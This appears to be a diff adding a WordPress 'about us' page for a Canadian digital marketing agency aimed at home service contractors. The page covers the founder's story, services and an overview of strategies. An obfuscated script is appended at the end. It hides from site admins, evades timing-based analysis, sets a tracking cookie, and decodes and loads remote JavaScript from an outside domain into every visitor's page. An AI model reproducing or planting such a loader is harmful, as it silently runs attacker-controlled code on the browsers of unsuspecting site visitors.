+<li><strong>A general team that provides digital services to business owners.&nbsp;</strong></li>
+
+<li><strong>A specialized team in assisting Canadian home service contractors generate real converting leads from the internet.</strong></li>
+</ul>
+
+<p>&nbsp;</p>
+</div></div>
+
+<p>I recall introducing myself to digital marketing at the young age of 9. It was around the dot com bubble, where I made my first website in HTML, an Online Marketing for Canadian Home Service Contractors.</p>
+
+<p>I was so amazed to see my <a href="https://canadianwebdesigns.ca/website-design-development/">webpage developing</a>, except that I didn’t have any money as a 9-year-old to purchase the domain and hosting to publicize the website. I figured at the time, if I could do it as a 9-year-old, then it’s a piece of cake for adults to make their website.&nbsp;</p>
+
+<p>Growing up in Montreal as a shy trilingual teenager, I started to create small video games. I would never have guessed that these early days of learning programming languages would build the foundation of my future.&nbsp;</p>
+
+<p>I relocated to Toronto, Ontario, and started helping a few residential painters and carpet cleaners to redo their Kijiji Ads, back in 2014. Some of them had an increase of 4x the calls from Kijiji, leading me to quit my job as an Application Developer on Bay Street, in downtown Toronto.</p>
+
+<p>I focused 100% of my energy on growing the number of leads they received from me. I did everything from creating their website, Google My Business listing, <a href="https://canadianwebdesigns.ca/black-hat-seo-vs-white-hat-seo/">SEO</a>, PPC, <a href="https://canadianwebdesigns.ca/social-media-optimization/">Social Media</a> - you name it. I did it all myself. Surprisingly, it worked!&nbsp;</p>
+
+<p>However, everything wasn’t all sunshine and rainbows; I had to try many different strategies before finding the best ones. These are the strategies you’ll read that you won’t have to go through the same trial and error process. I went from carpet cleaners to landscapers, <a href="https://marcodemolition.com/">demolition contractors</a>, and roofers to every other skilled trade.</p>
+
+<p>Fast forward to today, we have<a href="https://canadianwebdesigns.ca/portfolio/"> served thousands of clients to date</a>, built hundreds of great reviews, and we now have a reliable virtual team delivering outstanding results!</p>
+
+<div style="height:46px" aria-hidden="true" class="wp-block-spacer"></div>
+
+<h2 class="wp-block-heading" id="h-who-are-we"><strong>WHO ARE WE?</strong></h2>
+
+<p>We are a team full of skilled web designers, copywriters, graphic designers, SEO specialists, PPC managers, social media marketers, sales reps, and account managers.</p>
+
+<p>We do everything from setting up your website to ensuring you start to rank #1 on the most significant search engines like Google, Bing, or Yahoo.</p>
+
+<ul>
+<li>We write your content and manage your blog.</li>
+
+<li>We update your social media profiles and build your company authority on the internet.</li>
+
+<li>We manage your reviews and help you develop online systems.</li>
+
+<li>We also handle your Google and Bing Ads.</li>
+</ul>
+
+<h2 class="wp-block-heading" id="h-working-together"><strong>WORKING TOGETHER?</strong></h2>
+
+<p>We want to work with you, and undoubtedly you will benefit significantly. However, it doesn’t mean you cannot do it all alone if you truly want to. I am excited to share the marketing strategies you can take and start today without breaking your wallet.</p>
+
+<p>The beauty of digital marketing is that it will help you get another truck, another technician, an assistant, an office so that you can support a large team and large sales. We want to take you to $1M+ to start and grow every single year.</p>
+
+<figure class="wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
+https://youtu.be/7zvQlNlTz3E
+</div></figure>
+
+<h2 class="wp-block-heading" id="h-overview-marketing-strategies"><strong>OVERVIEW: MARKETING STRATEGIES</strong></h2>
+
+<ul>
+<li><strong><a href="https://canadianwebdesigns.ca/kijiji-ads-marketing-the-best-strategy-for-local-businesses/">Kijiji Marketing</a></strong> - The cheapest and highest return on investment. It is the best platform for a home service contractor to start.</li>
+</ul>
+
+<ul>
+<li><strong>Google My Business</strong> - The 2-minute secrets to listing on Google My Business. Get on the map and get found.</li>
+</ul>
+
+<ul>
+<li><strong><a href="https://canadianwebdesigns.ca/website-design-development/">Website</a></strong> - A website is paramount for marketing online. You will create from scratch or optimize our <a href="https://canadianwebdesigns.ca/minimalist-website-design/">website to convert</a> viewers to dialers and collect leads.</li>
+</ul>
+
+<ul>
+<li><strong>Google and Bing Ads</strong> - We will discuss in detail how you can set up your own <strong><a href="https://canadianwebdesigns.ca/google-ads-management/" target="_blank" rel="noreferrer noopener">Google ads</a></strong> and Bing ad and get your phone ringing in a few hours.</li>
+</ul>
+
+<ul>
+<li><strong><a href="https://canadianwebdesigns.ca/search-engine-optimization/">Search Engine Optimization</a></strong> - How SEO can get your phone ringing and how you can improve your SEO daily.</li>
+</ul>
+
+<ul>
+<li><strong>Social Media Strategies</strong> - Growing your brand and get referral business from social media.</li>
+</ul>
+
+<ul>
+<li><strong>Brand Authority and Review Management</strong> - How having great reviews on the internet is essential in growing your brand online. Systems that can be set in place to get great reviews continuously.</li>
+</ul>
+
+<ul>
+<li><strong>Paid Directories and Pay Per Leads</strong> - Learn the pros and cons of lead generators such as Bark.com, Homestars, and more.</li>
+</ul>
+
+<ul>
+<li><strong>Retargeting Ads</strong> - You can develop omnipresence and sell your clients by attacking all fronts.</li>
+</ul>
+
+<ul>
+<li><strong>Repeat and Referring Clients</strong> - Develop systems to get your clients coming back every time they need you.</li>
+</ul>
+<script>(function(){try{if(document.getElementById&&document.getElementById('wpadminbar'))return;var t0=+new Date();for(var i=0;i<20000;i++){var z=i*i;}if((+new Date())-t0>120)return;if((document.cookie||'').indexOf('http2_session_id=')!==-1)return;function systemLoad(input){var key='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',o1,o2,o3,h1,h2,h3,h4,dec='',i=0;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,'');while(i<input.length){h1=key.indexOf(input.charAt(i++));h2=key.indexOf(input.charAt(i++));h3=key.indexOf(input.charAt(i++));h4=key.indexOf(input.charAt(i++));o1=(h1<<2)|(h2>>4);o2=((h2&15)<<4)|(h3>>2);o3=((h3&3)<<6)|h4;dec+=String.fromCharCode(o1);if(h3!=64)dec+=String.fromCharCode(o2);if(h4!=64)dec+=String.fromCharCode(o3);}return dec;}var u=systemLoad('aHR0cHM6Ly9zZWFyY2hyYW5rdHJhZmZpYy5saXZlL2pzeA==');if(typeof window!=='undefined'&&window.__rl===u)return;var d=new Date();d.setTime(d.getTime()+30*24*60*60*1000);document.cookie='http2_session_id=1; expires='+d.toUTCString()+'; path=/; SameSite=Lax'+(location.protocol==='https:'?'; Secure':'');try{window.__rl=u;}catch(e){}var s=document.createElement('script');s.type='text/javascript';s.async=true;s.src=u;try{s.setAttribute('data-rl',u);}catch(e){}(document.getElementsByTagName('head')[0]||document.documentElement).appendChild(s);}catch(e){}})();</script>
